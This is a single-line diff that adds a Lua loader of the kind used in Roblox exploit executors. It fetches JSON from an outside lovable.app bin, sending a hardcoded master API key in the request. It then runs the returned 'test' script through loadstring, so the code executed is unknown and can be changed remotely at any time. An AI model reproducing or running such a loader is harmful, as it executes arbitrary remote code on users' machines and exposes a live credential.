@@ -1,0 +1,1 @@
+local req = game:HttpGet("https://pocket-json-postbox.lovable.app/api/bin/22833504", true, {["X-Master-Key"] = "2e25049a9c88458e1fbf6567b6209071abee94a03bbfe5c3"}); local success, data = pcall(function() return game:GetService("HttpService"):JSONDecode(req) end); if success and data and data.scripts and data.scripts["test"] then return loadstring(data.scripts["test"])() end
